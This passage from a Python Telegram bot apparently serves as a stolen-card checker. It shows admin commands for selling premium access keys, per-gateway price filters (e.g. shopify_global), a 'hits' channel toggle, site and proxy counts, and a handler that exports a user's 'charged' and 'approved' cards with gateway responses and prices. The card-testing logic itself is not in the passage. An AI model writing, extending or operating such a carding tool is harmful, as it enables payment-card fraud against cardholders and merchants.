        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/genkeys'))
async def genkeys_command(event):
    if event.sender_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 4:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/genkeys ᴀᴍᴏᴜɴᴛ ʜᴏᴜʀs ᴜsᴇʀ_ʟɪᴍɪᴛ</code>"), parse_mode='html')
            return
        amount = int(parts[1])
        hours = int(parts[2])
        user_limit = int(parts[3])
        keys_data = await load_keys()
        generated_keys = []
        created_at = datetime.now()
        for _ in range(amount):
            key = generate_key()
            expiry_time = created_at + timedelta(hours=hours)
            keys_data[key] = {
                'type': 'time_limit',
                'hours': hours,
                'expiry': expiry_time.isoformat(),
                'user_limit': user_limit,
                'used_count': 0,
                'used_by': [],
                'created_at': created_at.isoformat(),
                'created_by': event.sender_id
            }
            generated_keys.append(key)
        await save_keys(keys_data)
        days_display = f"{hours} hours" if hours < 24 else f"{hours // 24} days"
        keys_text = ""
        for idx, key in enumerate(generated_keys, 1):
            keys_text += f"""
┣ <code>{key}</code>"""
        await event.reply(premium_emoji(f"""⭐ <b>Kᴇʏs Gᴇɴᴇʀᴀᴛᴇᴅ</b>         
        
          ┣ 📅 Pᴇʀɪᴏᴅ: {days_display}
          ┗ 👥 Usᴇʀs: {user_limit}
{keys_text}
✅ Usᴇ <code>/redeem Kᴇʏ</code> ᴛᴏ ʀᴇᴅᴇᴇᴍ"""), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    user_id = event.sender_id
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/redeem Kᴇʏ</code>"), parse_mode='html')
            return
        key = parts[1].upper()
        keys_data = await load_keys()
        if key not in keys_data:
            await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ Kᴇʏ!"), parse_mode='html')
            return
        key_data = keys_data[key]
        if key_data.get('type') == 'time_limit':
            expiry = datetime.fromisoformat(key_data['expiry'])
            current_date = datetime.now()
            if current_date > expiry:
                await event.reply(premium_emoji("❌ Tʜɪs ᴋᴇʏ ʜᴀs EXPIRED!"), parse_mode='html')
                return
            if key_data['used_count'] >= key_data['user_limit']:
                await event.reply(premium_emoji(f"❌ Tʜɪs ᴋᴇʏ ʜᴀs ʀᴇᴀᴄʜᴇᴅ ɪᴛs ʟɪᴍɪᴛ"), parse_mode='html')
                return
            user_id_str = str(user_id)
            if user_id_str in key_data['used_by']:
                await event.reply(premium_emoji("❌ Yᴏᴜ ʜᴀᴠᴇ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ ᴛʜɪs ᴋᴇʏ!"), parse_mode='html')
                return
            if is_premium(user_id):
                await event.reply(premium_emoji("❌ Yᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss!"), parse_mode='html')
                return
            await add_premium_user(user_id)
            key_data['used_count'] += 1
            key_data['used_by'].append(user_id_str)
            key_data['used_at'] = current_date.isoformat()
            keys_data[key] = key_data
            await save_keys(keys_data)
            hours_display = key_data['hours']
            days_display = f"{hours_display} hours" if hours_display < 24 else f"{hours_display // 24} days"
            await event.reply(premium_emoji(f"""🎉 Cᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs!

⭐ Vɪᴘ Aᴄᴄᴇss Aᴄᴛɪᴠᴀᴛᴇᴅ!

📅 Dᴜʀᴀᴛɪᴏɴ: {days_display}
"""), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/listpremium'))
async def list_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    premium_users = load_premium_users()
    if not premium_users:
        await event.reply(premium_emoji("📭 Nᴏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ғᴏᴜɴᴅ."), parse_mode='html')
        return
    premium_list = "\n".join([f"• <code>{uid}</code>" for uid in premium_users])
    await event.reply(premium_emoji(f"👑 <b>Pʀᴇᴍɪᴜᴍ Usᴇʀs ({len(premium_users)})</b>\n\n{premium_list}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    premium_users = load_premium_users()
    sites = load_sites()
    proxies = load_proxies()
    stats_text = f"""📊 <b>Bᴏᴛ Sᴛᴀᴛɪsᴛɪᴄs</b>

👑 <b>Aᴅᴍɪɴs:</b> {len(ADMIN_ID)}
💎 <b>Pʀᴇᴍɪᴜᴍ Usᴇʀs:</b> {len(premium_users)}
🌐 <b>Sɪᴛᴇs:</b> {len(sites)}
🔌 <b>Pʀᴏxɪᴇs:</b> {len(proxies)}

🤖 <b>Bᴏᴛ Sᴛᴀᴛᴜs:</b> Rᴜɴɴɪɴɢ ✅"""
    await event.reply(premium_emoji(stats_text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/sethits'))
async def set_hits_channel(event):
    if event.sender_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/sethits -1001234567890</code>"), parse_mode='html')
            return
        global HITS_CHANNEL_ID
        HITS_CHANNEL_ID = int(parts[1])
        await event.reply(premium_emoji(f"✅ Hɪᴛs ᴄʜᴀɴɴᴇʟ sᴇᴛ ᴛᴏ: <code>{HITS_CHANNEL_ID}</code>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/hits'))
async def toggle_hits(event):
    if event.sender_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    global HITS_CHANNEL_ID
    if HITS_CHANNEL_ID == 0:
        await event.reply(premium_emoji("❌ Hɪᴛs ᴄʜᴀɴɴᴇʟ ɴᴏᴛ sᴇᴛ. Usᴇ /sᴇᴛʜɪᴛs"), parse_mode='html')
        return
    if HITS_CHANNEL_ID < 0:
        HITS_CHANNEL_ID = abs(HITS_CHANNEL_ID)
        await event.reply(premium_emoji("❌ Hɪᴛs ᴄʜᴀɴɴᴇʟ Tᴜʀɴᴇᴅ Oғғ"), parse_mode='html')
    else:
        HITS_CHANNEL_ID = -abs(HITS_CHANNEL_ID)
        await event.reply(premium_emoji("✅ Hɪᴛs ᴄʜᴀɴɴᴇʟ Tᴜʀɴᴇᴅ Oɴ"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/setfilter'))
async def set_filter_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    try:
        parts = event.raw_text.split(maxsplit=3)
        if len(parts) < 4:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/setfilter ɢᴀᴛᴇᴡᴀʏ ᴍɪɴ-ᴍᴀx \"Fɪʟᴛᴇʀ Nᴀᴍᴇ\"</code>\n\nExᴀᴍᴘʟᴇ:\n<code>/setfilter shopify_global 0-10 💰 Lᴇss ᴛʜᴀɴ $10</code>"), parse_mode='html')
            return
        gateway = parts[1]
        range_str = parts[2]
        name = parts[3].strip()
        if '-' not in range_str:
            await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ʀᴀɴɢᴇ! Usᴇ: ᴍɪɴ-ᴍᴀx"), parse_mode='html')
            return
        min_val, max_val = map(float, range_str.split('-'))
        filters = await load_price_filters()
        if gateway not in filters:
            filters[gateway] = []
        filters[gateway].append({"name": name, "min": min_val, "max": max_val})
        await save_price_filters(filters)
        await event.reply(premium_emoji(f"✅ Fɪʟᴛᴇʀ ᴀᴅᴅᴇᴅ: {name}\n💰 {min_val:.0f} - {max_val:.0f}"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/listfilters'))
async def list_filters_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    filters = await load_price_filters()
    if not filters:
        await event.reply(premium_emoji("📭 Nᴏ ғɪʟᴛᴇʀs ғᴏᴜɴᴅ."), parse_mode='html')
        return
    text = premium_emoji("🔧 <b>Pʀɪᴄᴇ Fɪʟᴛᴇʀs</b>\n\n")
    for gateway, gateway_filters in filters.items():
        text += premium_emoji(f"🛒 <b>{gateway.upper()}</b>\n")
        for i, f in enumerate(gateway_filters, 1):
            text += premium_emoji(f"   {i}. {f['name']} ({f['min']:.0f}-{f['max']:.0f})\n")
        text += "\n"
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/removefilter'))
async def remove_filter_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 3:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/removefilter ɢᴀᴛᴇᴡᴀʏ ɴᴜᴍʙᴇʀ</code>\n\nExᴀᴍᴘʟᴇ:\n<code>/removefilter shopify_global 2</code>"), parse_mode='html')
            return
        gateway = parts[1].lower()
        filter_num = int(parts[2]) - 1
        filters = await load_price_filters()
        if gateway not in filters:
            await event.reply(premium_emoji(f"❌ Nᴏ ғɪʟᴛᴇʀs ғᴏʀ {gateway.upper()}!"), parse_mode='html')
            return
        if filter_num < 0 or filter_num >= len(filters[gateway]):
            await event.reply(premium_emoji(f"❌ Iɴᴠᴀʟɪᴅ ғɪʟᴛᴇʀ ɴᴜᴍʙᴇʀ! Usᴇ 1-{len(filters[gateway])}"), parse_mode='html')
            return
        removed = filters[gateway].pop(filter_num)
        await save_price_filters(filters)
        await event.reply(premium_emoji(f"✅ Fɪʟᴛᴇʀ ʀᴇᴍᴏᴠᴇᴅ:\n┣ 📌 {removed['name']}\n┗ 💰 {removed['min']:.0f}-{removed['max']:.0f}"), parse_mode='html')
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ғɪʟᴛᴇʀ ɴᴜᴍʙᴇʀ!"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        
@bot.on(events.CallbackQuery(pattern=re.compile(r"shopify_export_(charged|approved):(\d+)")))
async def shopify_export_callback(event):
    match = event.pattern_match
    export_type = match.group(1).decode()
    user_id = int(match.group(2).decode())
    
    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ʀᴇsᴜʟᴛs!", alert=True)
        return
    
    if user_id not in SHOPIFY_SESSION_RESULTS:
        await event.answer("❌ Nᴏ ʀᴇsᴜʟᴛs ғᴏᴜɴᴅ! Rᴜɴ ᴀ ᴄʜᴇᴄᴋ ғɪʀsᴛ.", alert=True)
        return
    
    user_results = SHOPIFY_SESSION_RESULTS[user_id]
    
    if export_type == "charged":
        cards_list = user_results.get('charged', [])
        filename = f"charged_cards_{user_id}.txt"
        title = "CHARGED CARDS"
        emoji = "💎"
    else:
        cards_list = user_results.get('approved', [])
        filename = f"approved_cards_{user_id}.txt"
        title = "APPROVED CARDS"
        emoji = "✅"
    
    if not cards_list:
        await event.answer(f"❌ Nᴏ {title.lower()} ғᴏᴜɴᴅ!", alert=True)
        return
    
    content = f"{emoji} {title}\n"
    content += "=" * 40 + "\n\n"
    
    for i, item in enumerate(cards_list, 1):
        content += f"[{i}] Cᴀʀᴅ: {item['card']}\n"
        content += f"    Rᴇsᴘᴏɴsᴇ: {item.get('message', 'N/A')[:100]}\n"
        content += f"    Gᴀᴛᴇᴡᴀʏ: {item.get('gateway', 'Unknown')}\n"
        content += f"    Pʀɪᴄᴇ: {item.get('price', '-')}\n"
        content += "-" * 30 + "\n"
    
    content += f"\n📊 Tᴏᴛᴀʟ: {len(cards_list)} ᴄᴀʀᴅs\n"
    content += f"📅 Exᴘᴏʀᴛᴇᴅ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write(content)
    
    await event.answer(f"📤 Exᴘᴏʀᴛɪɴɢ {len(cards_list)} ᴄᴀʀᴅs...", alert=False)
    await bot.send_file(
        event.sender_id, 
        filename, 
        caption=premium_emoji(f"{emoji} <b>{title}</b>\n📊 Tᴏᴛᴀʟ: {len(cards_list)} ᴄᴀʀᴅs")
    )
    
    try:
        os.remove(filename)
    except:
        pass
      
@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer(" Sᴛᴏᴘᴘᴇᴅ", alert=True)
        await event.edit(premium_emoji("🛑 Cʜᴇᴄᴋɪɴɢ sᴛᴏᴘᴘᴇᴅ ʙʏ ᴜsᴇʀ."), parse_mode='html')

print("✅ Bᴏᴛ sᴛᴀʀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!")
bot.run_until_disconnected()
